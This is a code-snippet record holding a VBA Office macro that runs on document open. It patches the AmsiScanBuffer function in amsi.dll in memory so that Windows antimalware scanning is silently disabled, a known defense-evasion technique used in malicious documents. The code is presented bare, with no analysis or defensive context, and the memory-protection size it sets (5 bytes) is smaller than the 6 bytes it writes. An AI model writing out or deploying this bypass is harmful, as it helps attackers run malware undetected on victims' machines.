---
id: 1e1e9f01-be15-49f5-8bda-3f443bc81a94
type: code
language: vb
verified: false
created_at: '2023-04-06T03:56:23.872446+00:00'
updated_at: '2023-04-10T20:36:59.496762+00:00'
---

# Code Snippet 1e1e9f01

**Language**: vb

```vb
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)

Private Sub Document_Open()
    Dim AmsiDLL As LongPtr
    Dim AmsiScanBufferAddr As LongPtr
    Dim result As Long
    Dim MyByteArray(6) As Byte
    Dim ArrayPointer As LongPtr

    MyByteArray(0) = 184 ' 0xB8
    MyByteArray(1) = 87  ' 0x57
    MyByteArray(2) = 0   ' 0x00
    MyByteArray(3) = 7   ' 0x07
    MyByteArray(4) = 128 ' 0x80
    MyByteArray(5) = 195 ' 0xC3

    ' Load the amsi.dll library
    AmsiDLL = LoadLibrary("amsi.dll")
    ' Get the address of the AmsiScanBuffer function
    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, "AmsiScanBuffer")
    ' Change the memory protection of the AmsiScanBuffer function to allow writing
    result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0)
    ' Copy the shellcode to the AmsiScanBuffer function
    ArrayPointer = VarPtr(MyByteArray(0))
    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6
End Sub
```


